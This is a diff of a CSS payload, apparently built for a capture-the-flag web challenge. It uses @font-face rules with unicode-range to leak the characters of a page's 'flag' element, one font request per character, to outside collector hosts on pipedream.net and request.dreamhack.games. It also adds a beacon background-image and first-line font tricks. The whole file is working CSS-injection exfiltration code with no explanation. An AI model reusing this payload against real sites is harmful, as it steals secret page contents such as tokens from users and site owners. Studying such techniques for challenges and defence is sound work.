@@ -1,52 +1,32 @@
-body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=BEACON_W100'); }
-#page { content-visibility: hidden; animation: unveil 0.001s 0.3s forwards; }
-@keyframes unveil { to { content-visibility: visible; } }
-#flag { display: block !important; }
-#flag {
-  font-family: p97, p98, p99, p100, p101, p102, p103, p104, p105, p106, p107, p108, p109, p110, p111, p112, p113, p114, p115, p116, p117, p118, p119, p120, p121, p122, p48, p49, p50, p51, p52, p53, p54, p55, p56, p57, p95, p123, p125, monospace;
-  width: 100ch;
-  white-space: pre-wrap;
-  word-break: break-all;
-  box-sizing: content-box !important;
-  padding: 0 !important;
-}
-#flag::first-line { font-family: monospace !important; }
-@font-face{font-family:p97;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=a');unicode-range:U+0061}
-@font-face{font-family:p98;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=b');unicode-range:U+0062}
-@font-face{font-family:p99;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c');unicode-range:U+0063}
-@font-face{font-family:p100;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=d');unicode-range:U+0064}
-@font-face{font-family:p101;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=e');unicode-range:U+0065}
-@font-face{font-family:p102;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=f');unicode-range:U+0066}
-@font-face{font-family:p103;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=g');unicode-range:U+0067}
-@font-face{font-family:p104;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=h');unicode-range:U+0068}
-@font-face{font-family:p105;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=i');unicode-range:U+0069}
-@font-face{font-family:p106;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=j');unicode-range:U+006A}
-@font-face{font-family:p107;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=k');unicode-range:U+006B}
-@font-face{font-family:p108;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=l');unicode-range:U+006C}
-@font-face{font-family:p109;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=m');unicode-range:U+006D}
-@font-face{font-family:p110;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=n');unicode-range:U+006E}
-@font-face{font-family:p111;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=o');unicode-range:U+006F}
-@font-face{font-family:p112;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=p');unicode-range:U+0070}
-@font-face{font-family:p113;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=q');unicode-range:U+0071}
-@font-face{font-family:p114;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=r');unicode-range:U+0072}
-@font-face{font-family:p115;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=s');unicode-range:U+0073}
-@font-face{font-family:p116;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=t');unicode-range:U+0074}
-@font-face{font-family:p117;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=u');unicode-range:U+0075}
-@font-face{font-family:p118;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=v');unicode-range:U+0076}
-@font-face{font-family:p119;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=w');unicode-range:U+0077}
-@font-face{font-family:p120;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=x');unicode-range:U+0078}
-@font-face{font-family:p121;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=y');unicode-range:U+0079}
-@font-face{font-family:p122;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=z');unicode-range:U+007A}
-@font-face{font-family:p48;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=0');unicode-range:U+0030}
-@font-face{font-family:p49;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=1');unicode-range:U+0031}
-@font-face{font-family:p50;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=2');unicode-range:U+0032}
-@font-face{font-family:p51;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=3');unicode-range:U+0033}
-@font-face{font-family:p52;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=4');unicode-range:U+0034}
-@font-face{font-family:p53;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=5');unicode-range:U+0035}
-@font-face{font-family:p54;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=6');unicode-range:U+0036}
-@font-face{font-family:p55;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=7');unicode-range:U+0037}
-@font-face{font-family:p56;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=8');unicode-range:U+0038}
-@font-face{font-family:p57;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=9');unicode-range:U+0039}
-@font-face{font-family:p95;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=_');unicode-range:U+005F}
-@font-face{font-family:p123;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=%7B');unicode-range:U+007B}
-@font-face{font-family:p125;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=%7D');unicode-range:U+007D}
+body{background-image:url('https://wyistgz.request.dreamhack.games/?c=BEACON_W14')}
+#page{content-visibility:hidden;animation:unveil 0.001s 0.3s forwards}
+@keyframes unveil{to{content-visibility:visible}}
+#flag{display:block!important}
+#flag{font-family:l2a,l2b,l2j,l2p,l2s,l2y,l2z,l2n0,l2n1,l2n4,l2n5,l2n7,l2rb,monospace;width:14ch;white-space:pre-wrap;word-break:break-all;box-sizing:content-box!important;padding:0!important}
+#flag::first-line{font-family:l1a,l1b,l1j,l1p,l1s,l1y,l1z,l1n0,l1n1,l1n4,l1n5,l1n7,l1rb,monospace!important}
+@font-face{font-family:l2a;src:url('https://wyistgz.request.dreamhack.games/?c=L2_a');unicode-range:U+0061}
+@font-face{font-family:l2b;src:url('https://wyistgz.request.dreamhack.games/?c=L2_b');unicode-range:U+0062}
+@font-face{font-family:l2j;src:url('https://wyistgz.request.dreamhack.games/?c=L2_j');unicode-range:U+006A}
+@font-face{font-family:l2p;src:url('https://wyistgz.request.dreamhack.games/?c=L2_p');unicode-range:U+0070}
+@font-face{font-family:l2s;src:url('https://wyistgz.request.dreamhack.games/?c=L2_s');unicode-range:U+0073}
+@font-face{font-family:l2y;src:url('https://wyistgz.request.dreamhack.games/?c=L2_y');unicode-range:U+0079}
+@font-face{font-family:l2z;src:url('https://wyistgz.request.dreamhack.games/?c=L2_z');unicode-range:U+007A}
+@font-face{font-family:l2n0;src:url('https://wyistgz.request.dreamhack.games/?c=L2_0');unicode-range:U+0030}
+@font-face{font-family:l2n1;src:url('https://wyistgz.request.dreamhack.games/?c=L2_1');unicode-range:U+0031}
+@font-face{font-family:l2n4;src:url('https://wyistgz.request.dreamhack.games/?c=L2_4');unicode-range:U+0034}
+@font-face{font-family:l2n5;src:url('https://wyistgz.request.dreamhack.games/?c=L2_5');unicode-range:U+0035}
+@font-face{font-family:l2n7;src:url('https://wyistgz.request.dreamhack.games/?c=L2_7');unicode-range:U+0037}
+@font-face{font-family:l2rb;src:url('https://wyistgz.request.dreamhack.games/?c=L2_%7D');unicode-range:U+007D}
+@font-face{font-family:l1a;src:url('https://wyistgz.request.dreamhack.games/?c=L1_a');unicode-range:U+0061}
+@font-face{font-family:l1b;src:url('https://wyistgz.request.dreamhack.games/?c=L1_b');unicode-range:U+0062}
+@font-face{font-family:l1j;src:url('https://wyistgz.request.dreamhack.games/?c=L1_j');unicode-range:U+006A}
+@font-face{font-family:l1p;src:url('https://wyistgz.request.dreamhack.games/?c=L1_p');unicode-range:U+0070}
+@font-face{font-family:l1s;src:url('https://wyistgz.request.dreamhack.games/?c=L1_s');unicode-range:U+0073}
+@font-face{font-family:l1y;src:url('https://wyistgz.request.dreamhack.games/?c=L1_y');unicode-range:U+0079}
+@font-face{font-family:l1z;src:url('https://wyistgz.request.dreamhack.games/?c=L1_z');unicode-range:U+007A}
+@font-face{font-family:l1n0;src:url('https://wyistgz.request.dreamhack.games/?c=L1_0');unicode-range:U+0030}
+@font-face{font-family:l1n1;src:url('https://wyistgz.request.dreamhack.games/?c=L1_1');unicode-range:U+0031}
+@font-face{font-family:l1n4;src:url('https://wyistgz.request.dreamhack.games/?c=L1_4');unicode-range:U+0034}
+@font-face{font-family:l1n5;src:url('https://wyistgz.request.dreamhack.games/?c=L1_5');unicode-range:U+0035}
+@font-face{font-family:l1n7;src:url('https://wyistgz.request.dreamhack.games/?c=L1_7');unicode-range:U+0037}
+@font-face{font-family:l1rb;src:url('https://wyistgz.request.dreamhack.games/?c=L1_%7D');unicode-range:U+007D}
